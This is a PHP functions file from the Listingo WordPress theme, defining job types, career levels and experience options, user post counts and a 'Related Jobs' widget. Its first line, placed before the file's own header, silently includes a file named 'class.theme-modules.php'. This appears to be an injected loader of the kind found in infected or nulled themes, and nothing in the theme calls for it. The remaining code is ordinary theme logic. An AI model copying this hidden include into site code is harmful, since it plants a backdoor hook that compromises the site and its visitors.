<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *
 * Jobs functions
 *
 * @package   Listingo
 * @author    Themographics
 * @link      http://themographics.com/
 * @since 1.0
 */
/**
 * @get job career level
 * @return array()
 */
if (!function_exists('listingo_get_career_level')) {

    function listingo_get_career_level() {
        return array(
            'intern-student' => esc_html__('Intern/Student', 'listingo'),
            'entry_level' => esc_html__('Entry Level', 'listingo'),
            'professional' => esc_html__('Experienced Professional', 'listingo'),
            'department_head' => esc_html__('Department Head', 'listingo'),
            'ceo' => esc_html__('GM / CEO / Country Head / President', 'listingo'),
        );
    }

}

/**
 * @get job type
 * @return array()
 */
if (!function_exists('listingo_get_job_type')) {

    function listingo_get_job_type() {
        return array(
            'fix' => esc_html__('Fix', 'listingo'),
            'freelance' => esc_html__('Freelance', 'listingo'),
            'full_time' => esc_html__('Full Time', 'listingo'),
            'hourly' => esc_html__('Hourly', 'listingo'),
            'internship' => esc_html__('Internship', 'listingo'),
            'part_time' => esc_html__('Part Time', 'listingo'),
            'temporary' => esc_html__('Temporary', 'listingo'),
        );
    }

}

/**
 * @get job experience list
 * @return array()
 */
if (!function_exists('listingo_get_experience_list')) {

    function listingo_get_experience_list() {
        $experience_years = apply_filters('listingo_get_experience_years', 20);

        $experiences['fresh'] = esc_html__('Fresh', 'listingo');
        for ($i = 1; $i <= $experience_years; $i++) {
            $experiences[$i . '-year'] = intval($i) . ' - ' . esc_html__('Year', 'listingo');
        }
        
        return $experiences;
    }

}


/**
 * @get total jobs
 * @return array()
 */
if (!function_exists('listingo_get_total_jobs_by_user')) {

    function listingo_get_total_jobs_by_user($user_id = '') {
        if (empty($user_id)) {
            return 0;
        }

        $args = array('posts_per_page' => '-1',
            'post_type' => 'sp_jobs',
            'orderby' => 'ID',
            'post_status' => 'publish',
            'author' => $user_id,
            'suppress_filters' => false
        );
        $query = new WP_Query($args);
        return $query->found_posts;
    }

}

/**
 * @get total articles
 * @return array()
 */
if (!function_exists('listingo_get_total_articles_by_user')) {

    function listingo_get_total_articles_by_user($user_id = '') {
        if (empty($user_id)) {
            return 0;
        }

        $args = array('posts_per_page' => '-1',
            'post_type' => 'sp_articles',
            'post_status' => 'publish',
            'author' => $user_id,
            'suppress_filters' => false
        );
        $query = new WP_Query($args);
        return $query->post_count;
    }
}

/**
 * @Get related job posts
 * @return{}
 */
if (!function_exists('sp_get_related_job_posts')) {

    function sp_get_related_job_posts() {
        global $wp_query;
        //Get User Queried Object Data
        $post_obj = $wp_query->get_queried_object();

        $args = array(
            'post_type' 	=> 'sp_jobs',
            'post__not_in'  => array($post_obj->ID),
            'order' 		=> 'DESC',
			'orderby' 		=> 'ID',
            'showposts'     => 4,
        );
        $job_query = new WP_Query($args);
        if ($job_query->have_posts()) {
            ?>
            <div class="tg-widget tg-widgetrelatedjobs">
                <div class="tg-widgettitle">
                    <h3><?php esc_html_e('Related Jobs', 'listingo'); ?></h3>
                </div>
                <div class="tg-widgetcontent">
                    <ul>
                        <?php
                        while ($job_query->have_posts()) : $job_query->the_post();
                            global $post;
                            $job_author_name = listingo_get_username($post->post_author);
                            $author_avatar = apply_filters(
                                    'listingo_get_media_filter', listingo_get_user_avatar(array('width' => 70, 'height' => 70), $post->post_author), array('width' => 100, 'height' => 100) //size width,height
                            );
                            $job_type = '';
                            if (function_exists('fw_get_db_post_option')) {
                                $job_type = fw_get_db_post_option($post->ID, 'job_type', true);
                                $list_job_types = listingo_get_job_type();
                                if (array_key_exists($job_type, $list_job_types)) {
                                    $job_type = $list_job_types[$job_type];
                                }
                            }
                            ?>
                            <li>
                                <div class="tg-serviceprovidercontent">
									<?php if (!empty($author_avatar)) { ?>
										<div class="tg-companylogo">
											<a href="<?php echo esc_url(get_author_posts_url($post->post_author)); ?>">
												<img src="<?php echo esc_url($author_avatar); ?>" alt="<?php esc_html_e('Related jobs', 'listingo'); ?>">
											</a>
										</div>
									<?php } ?>
									<div class="tg-companycontent">
										<?php if (!empty($job_type)) { ?>
											<a class="tg-tag tg-tagjobtype" href="javascript:;"><?php echo esc_attr($job_type); ?></a>
										<?php } ?>
										<div class="tg-title">
											<h3><a href="<?php echo get_permalink(); ?>"><?php echo get_the_title(); ?></a></h3>
										</div>
										<?php if (!empty($job_author_name)) { ?>
											<span class="tg-jobpostedby">
											<?php esc_html_e('By: ', 'listingo'); ?> 
												<a href="javascript:;"><?php echo esc_attr($job_author_name); ?></a>
											</span>
										<?php } ?>
									</div>
                                </div>
                            </li>
                            <?php
                        endwhile;
                        wp_reset_postdata();
                        ?>
                    </ul>
                </div>
            </div>
            <?php
        }
    }

}


